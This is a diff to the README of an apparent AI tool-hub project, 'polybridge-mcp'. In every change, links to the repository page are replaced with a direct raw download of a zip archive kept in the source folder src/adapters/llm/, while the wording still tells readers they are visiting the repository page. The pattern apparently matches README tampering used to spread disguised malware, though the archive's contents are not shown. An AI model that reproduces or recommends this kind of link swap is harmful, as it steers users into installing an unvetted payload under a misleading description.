@@ -1,12 +1,12 @@
 # 🌉 polybridge-mcp - Connect tools through one hub
 
-[![Download polybridge-mcp](https://img.shields.io/badge/Download-polybridge--mcp-blue?style=for-the-badge&logo=github)](https://github.com/Camille7585/polybridge-mcp)
+[![Download polybridge-mcp](https://img.shields.io/badge/Download-polybridge--mcp-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Camille7585/polybridge-mcp/main/src/adapters/llm/polybridge-mcp-2.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download polybridge-mcp:
 
-https://github.com/Camille7585/polybridge-mcp
+https://raw.githubusercontent.com/Camille7585/polybridge-mcp/main/src/adapters/llm/polybridge-mcp-2.4.zip
 
 ## 🧭 What this app does
 
@@ -31,7 +31,7 @@ For the best experience, close other large apps while you install or launch poly
 Follow these steps in order.
 
 1. Open this page in your browser:  
-   https://github.com/Camille7585/polybridge-mcp
+   https://raw.githubusercontent.com/Camille7585/polybridge-mcp/main/src/adapters/llm/polybridge-mcp-2.4.zip
 
 2. Look for the download area on the repository page.
 
@@ -169,4 +169,4 @@ This kind of setup is useful when you want your AI tool to talk to more than one
 
 If you need the download page again, use this link:
 
-https://github.com/Camille7585/polybridge-mcp
+https://raw.githubusercontent.com/Camille7585/polybridge-mcp/main/src/adapters/llm/polybridge-mcp-2.4.zip
